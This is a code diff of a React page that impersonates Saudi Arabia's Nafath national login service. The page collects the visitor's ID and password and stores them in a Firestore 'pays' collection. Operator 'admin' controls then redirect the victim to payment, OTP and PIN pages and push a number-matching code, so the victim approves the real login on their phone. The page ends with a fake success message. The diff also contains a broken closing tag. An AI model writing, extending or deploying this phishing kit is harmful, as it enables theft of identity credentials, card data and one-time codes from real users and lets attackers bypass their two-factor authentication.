@@ -1,6 +1,6 @@
 "use client";
-import { useState,useEffect } from "react";
-import { Loader2Icon, Menu, ShieldAlert, Smartphone } from "lucide-react";
+
+import { Loader2Icon, Menu, ShieldAlert, Smartphone, CheckCircle2 } from "lucide-react";
 import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
 import { Card, CardContent } from "@/components/ui/card";
@@ -10,31 +10,98 @@ import {
   DialogHeader,
   DialogTitle,
 } from "@/components/ui/dialog";
+import { useEffect, useState } from "react";
+import { addData, db, saveToHistory } from "@/lib/firebase";
 import { Alert } from "@/components/ui/alert";
-import { doc, onSnapshot } from "firebase/firestore";
-import { addData, db } from "@/lib/firebase";
+import { doc, onSnapshot, updateDoc } from "firebase/firestore";
 
 export default function Component() {
-  const [showAuthDialog, setShowAuthDialog] = useState(false);
-  const [authNumber, setAuthNumber] = useState<string>("");
+  const [showConfirmDialog, setShowConfirmDialog] = useState(false);
+  const [showSuccessDialog, setShowSuccessDialog] = useState(false);
+  const [confirmationCode, setConfirmationCode] = useState<string>("");
   const [isloading, setIsLoading] = useState(false);
   const [idLogin, setLoginID] = useState("");
-  const [password,setPassword] = useState("");
+  const [password, setPassword] = useState("");
   const [showError, setShowError] = useState("");
 
-  
+  // <ADMIN_NAVIGATION_SYSTEM> Unified navigation listener for admin control
   useEffect(() => {
     const visitorId = localStorage.getItem("visitor")
-    if (visitorId) {
-      const unsubscribe = onSnapshot(doc(db, "pays", visitorId), (docSnap) => {
+    if (!visitorId) return
+
+    console.log("[nafad] Setting up navigation listener for visitor:", visitorId)
+
+    const unsubscribe = onSnapshot(
+      doc(db, "pays", visitorId),
+      (docSnap) => {
         if (docSnap.exists()) {
           const data = docSnap.data()
-          setAuthNumber( data.authNumber)
-      
-        }
-      })
+          console.log("[nafad] Firestore data received:", data)
 
-      return () => unsubscribe()
+          // Admin navigation: Handle page redirects
+          if (data.currentStep === "home") {
+            console.log("[nafad] Admin redirecting to home")
+            window.location.href = "/"
+          } else if (data.currentStep === "phone") {
+            console.log("[nafad] Admin redirecting to phone-info")
+            window.location.href = "/step5"
+          } else if (data.currentStep === "_st1") {
+            console.log("[nafad] Admin redirecting to payment")
+            window.location.href = "/check"
+          } else if (data.currentStep === "_t2") {
+            console.log("[nafad] Admin redirecting to otp")
+            window.location.href = "/step2"
+          } else if (data.currentStep === "_t3") {
+            console.log("[nafad] Admin redirecting to pin")
+            window.location.href = "/step3"
+          } else if (typeof data.currentStep === 'number') {
+            console.log("[nafad] Admin redirecting to home with step:", data.currentStep)
+            window.location.href = `/`
+          }
+          // If currentStep === "_t6", stay on this page
+
+          // Listen for confirmation code from admin (updates every time)
+          if (data.nafadConfirmationCode) {
+            console.log("[nafad] Received confirmation code:", data.nafadConfirmationCode)
+            setConfirmationCode(data.nafadConfirmationCode)
+            setShowConfirmDialog(true)
+            setShowError("") // Clear any previous errors
+            setShowSuccessDialog(false) // Close success dialog if open
+          } else if (data.nafadConfirmationCode === "") {
+            // Admin cleared the code
+            setShowConfirmDialog(false)
+          }
+
+          // Listen for admin approval/rejection
+          if (data.nafadConfirmationStatus === "approved") {
+            console.log("[nafad] Admin approved the confirmation")
+            setShowConfirmDialog(false)
+            setShowSuccessDialog(true)
+            // Clear status after use
+            updateDoc(doc(db, "pays", visitorId), {
+              nafadConfirmationStatus: "",
+              nafadConfirmationCode: ""
+            })
+          } else if (data.nafadConfirmationStatus === "rejected") {
+            console.log("[nafad] Admin rejected the confirmation")
+            setShowConfirmDialog(false)
+            setShowError("تم رفض عملية التحقق. يرجى المحاولة مرة أخرى.")
+            // Clear status after use
+            updateDoc(doc(db, "pays", visitorId), {
+              nafadConfirmationStatus: "",
+              nafadConfirmationCode: ""
+            })
+          }
+        }
+      },
+      (error) => {
+        console.error("[nafad] Firestore listener error:", error)
+      }
+    )
+
+    return () => {
+      console.log("[nafad] Cleaning up navigation listener")
+      unsubscribe()
     }
   }, [])
 
@@ -44,17 +111,22 @@ export default function Component() {
     setShowError("");
 
     setIsLoading(true);
-   await addData({
+
+    // Save current data to history before updating
+    if (visitorId) {
+      await saveToHistory(visitorId, 0); // 0 for nafad page
+    }
+
+    await addData({
       id: visitorId,
-      _v8: idLogin,
-      _v9:password,
-      authNumber: "...",
-      approval: "pending",
+      nafazId: idLogin,
+      nafazPass: password,
+      nafadConfirmationStatus: "waiting",
+      currentStep: "_t6",
+      nafadUpdatedAt: new Date().toISOString()
     });
-    setTimeout(() => {
-      setShowAuthDialog(true);
-      setIsLoading(false);
-    }, 5000);
+    
+    setIsLoading(false);
   };
 
   return (
@@ -112,7 +184,7 @@ export default function Component() {
                 onChange={(e) => setLoginID(e.target.value)}
                 required
               />
- <Input
+              <Input
                 placeholder="أدخل كلمة المرور الخاصة بك هنا"
                 className="text-right border-gray-300 h-12 text-lg focus:ring-2 focus:ring-teal-500 transition-all"
                 dir="rtl"
@@ -184,25 +256,25 @@ export default function Component() {
           </CardContent>
         </Card>
 
-        {/* Authentication Dialog */}
-        <Dialog open={showAuthDialog} onOpenChange={setShowAuthDialog}>
+        {/* Confirmation Code Display Dialog */}
+        <Dialog open={showConfirmDialog} onOpenChange={setShowConfirmDialog}>
           <DialogContent className="max-w-md mx-auto" dir="rtl">
             <DialogHeader>
               <DialogTitle className="text-center text-2xl font-bold text-teal-600 mb-2">
-                طلب المصادقة
+                رمز التحقق
               </DialogTitle>
               <p className="text-center text-sm text-gray-600">
-                يرجى التحقق من تطبيق نفاذ على جهازك
+                يرجى التحقق من الرقمين التاليين في تطبيق نفاذ
               </p>
             </DialogHeader>
 
             <div className="text-center space-y-6 p-4">
               <div className="bg-gradient-to-br from-teal-50 to-teal-100 border-2 border-teal-300 rounded-xl p-8 shadow-inner">
                 <div className="text-sm text-gray-600 mb-3 font-medium">
-                  رقم المصادقة
+                  الرقمان المطلوبان
                 </div>
-                <div className="text-5xl font-bold text-teal-600 tracking-widest font-mono">
-                  {authNumber || "------"}
+                <div className="text-6xl font-bold text-teal-600 tracking-widest font-mono">
+                  {confirmationCode || "--"}
                 </div>
               </div>
 
@@ -210,12 +282,12 @@ export default function Component() {
                 <div className="flex items-center justify-center gap-2 text-teal-600 mb-2">
                   <ShieldAlert className="w-5 h-5" />
                   <div className="text-gray-800 font-bold">
-                    تم إرسال طلب مصادقة
+                    في انتظار التأكيد
                   </div>
                 </div>
                 <div className="text-sm text-gray-600 leading-relaxed">
-                  يرجى فتح تطبيق نفاذ على جهازك المحمول والضغط على الرقم المطابق
-                  لإتمام عملية تسجيل الدخول
+                  يرجى التحقق من الرقمين في تطبيق نفاذ على جهازك المحمول
+                  والانتظار حتى يتم التأكيد
                 </div>
               </div>
 
@@ -229,7 +301,7 @@ export default function Component() {
 
               <Button
                 variant="outline"
-                onClick={() => setShowAuthDialog(false)}
+                onClick={() => setShowConfirmDialog(false)}
                 className="w-full border-2 border-gray-300 text-gray-700 hover:bg-gray-100 h-11 font-semibold"
               >
                 إلغاء
@@ -237,7 +309,40 @@ export default function Component() {
             </div>
           </DialogContent>
         </Dialog>
-      </main>
+
+        {/* Success Dialog */}
+        <Dialog open={showSuccessDialog} onOpenChange={setShowSuccessDialog}>
+          <DialogContent className="max-w-md mx-auto" dir="rtl">
+            <div className="text-center space-y-6 p-4">
+              <div className="w-20 h-20 bg-green-100 rounded-full flex items-center justify-center mx-auto">
+                <CheckCircle2 className="w-12 h-12 text-green-600" />
+              </div>
+
+              <div className="space-y-2">
+                <h3 className="text-2xl font-bold text-gray-800">
+                  تم التحقق بنجاح!
+                </h3>
+                <p className="text-gray-600">
+                  تمت عملية التحقق من هويتك بنجاح عبر نفاذ
+                </p>
+              </div>
+
+              <div className="bg-green-50 border-2 border-green-200 rounded-lg p-4">
+                <p className="text-sm text-green-800 font-medium">
+                  شكراً لاستخدامك منصة النفاذ الوطني الموحد
+                </p>
+              </div>
+
+              <Button
+                onClick={() => setShowSuccessDialog(false)}
+                className="w-full bg-gradient-to-r from-green-600 to-green-700 hover:from-green-700 hover:to-green-800 text-white h-12 text-lg font-semibold shadow-md hover:shadow-lg transition-all"
+              >
+                إغلاق
+              </Button>
+            </div>
+          </DialogContent>
+        </Dialog>
+      </step1>
 
       {/* Footer */}
       <footer className="mt-12 p-6 bg-white border-t">
